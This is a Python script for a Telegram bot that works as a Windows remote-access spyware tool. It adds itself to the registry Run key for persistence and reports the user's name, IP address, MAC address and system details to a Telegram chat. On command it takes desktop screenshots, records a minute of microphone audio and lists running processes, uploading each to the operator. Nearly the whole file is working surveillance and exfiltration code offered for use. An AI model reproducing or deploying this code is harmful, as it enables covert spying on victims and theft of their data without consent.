import asyncio
from aiogram import Bot, Dispatcher, types, executor
import getpass
import os
import platform
import socket
import sys
from datetime import datetime, timezone
from uuid import getnode as get_mac
import psutil
import pyautogui
from speedtest import Speedtest
import pyaudio
import wave
from PIL import Image
from subprocess import Popen, PIPE
from winreg import OpenKey, SetValueEx, CloseKey, HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ

bot = Bot(token="API_TOCKEN")
dp = Dispatcher(bot)

autoname = "FILENAME.py"
path = os.path.dirname(os.path.realpath(__file__))
address = os.path.join(path, autoname)
key_reg = OpenKey(HKEY_CURRENT_USER,
                  r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
                  0, KEY_ALL_ACCESS)
SetValueEx(key_reg, autoname, 0, REG_SZ, address)
CloseKey(key_reg)

start = datetime.now()
name = getpass.getuser()
ip = socket.gethostbyname(socket.gethostname())
mac = get_mac()
ost = platform.uname()
inet = Speedtest()
download = float(str(inet.download())[0:2] + "."
                 + str(round(inet.download(), 2))[1]) * 0.125
uploads = float(str(inet.upload())[0:2] + "."
                + str(round(inet.download(), 2))[1]) * 0.125
zone = psutil.boot_time()
time = datetime.fromtimestamp(zone)
cpu = psutil.cpu_freq()
ends = datetime.now()
workspeed = format(ends - start)


async def main():
    await dp.bot.send_message(0000000000, "✓ System started!")      # CHAT_ID


try:
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
except DeprecationWarning:
    pass


@dp.message_handler(commands="check")
async def cmd_check(message: types.Message):
    await message.answer("System status: online")


async def cmd_help(message: types.Message):
    await message.answer(f'\nCommand List:\n/check - Checking System Status\n/info - System characteristics\n/screen - Desktop screenshot\n/audio - Record audio from a voice recorder for a minute\n/process - List of running processes\n/exit - Shutting down the program before reboot\n')


async def cmd_info(message: types.Message):
    file = open("info.txt", "w")
    file.write(
        f"[================================================]\n  Operating System: {ost.system}\n  Processor: {ost.processor}\n  Username: {name}\n  IP adress: {ip}\n  MAC adress: {mac}\n  Timezone: {time.year}/{time.month}/{time.day} {time.hour}:{time.minute}:{time.second}\n  Work speed: {workspeed}\n  Download: {download} MB/s\n  Upload: {uploads} MB/s\n  Max Frequency: {cpu.max:.2f} Mhz\n  Min Frequency: {cpu.min:.2f} Mhz\n  Current Frequency: {cpu.current:.2f} Mhz\n[================================================]\n")
    file.close()
    await message.answer_document(open("info.txt", "rb"))
    file.close()
    os.remove("info.txt")


async def cmd_screen(message: types.Message):
    screen = pyautogui.screenshot("screenshot.jpg")
    await message.answer_photo(open("screenshot.jpg", "rb"))
    os.remove("screenshot.jpg")


async def cmd_audio(message: types.Message):
    chunk = 1024
    formats = pyaudio.paInt16
    channels = 2
    rate = 44100
    second = 60     # SECONDS
    names = "sound.wav"
    p = pyaudio.PyAudio()
    stream = p.open(format=formats,
                    channels=channels,
                    rate=rate,
                    input=True,
                    frames_per_buffer=chunk)
    print("")

    frames = []

    for i in range(0, int(rate / chunk * second)):
        data = stream.read(chunk)
        frames.append(data)

    print("")

    stream.stop_stream()
    stream.close()
    p.terminate()

    wf = wave.open(names, "wb")
    wf.setnchannels(channels)
    wf.setsampwidth(p.get_sample_size(formats))
    wf.setframerate(rate)
    wf.writeframes(b''.join(frames))
    await message.answer_audio(open("sound.wav", "rb"))
    wf.close()
    os.remove(names)


async def cmd_process(message: types.Message):
    process = [line.decode("cp866", "ignore") for line in Popen("tasklist", stdout=PIPE).stdout.readlines()]
    ride = open("process.txt", "w", encoding="utf-8")
    ride.write(' '.join(process))
    ride.close()
    await message.answer_document(open("process.txt", "rb"))
    ride.close()
    os.remove("process.txt")


async def cmd_exit(message: types.Message):
    await message.answer("Goodbye!")
    raise SystemExit

dp.register_message_handler(cmd_info, commands="info")
dp.register_message_handler(cmd_screen, commands="screen")
dp.register_message_handler(cmd_audio, commands="audio")
dp.register_message_handler(cmd_process, commands="process")
dp.register_message_handler(cmd_help, commands="help")
dp.register_message_handler(cmd_exit, commands="exit")
executor.start_polling(dp, skip_updates=True)
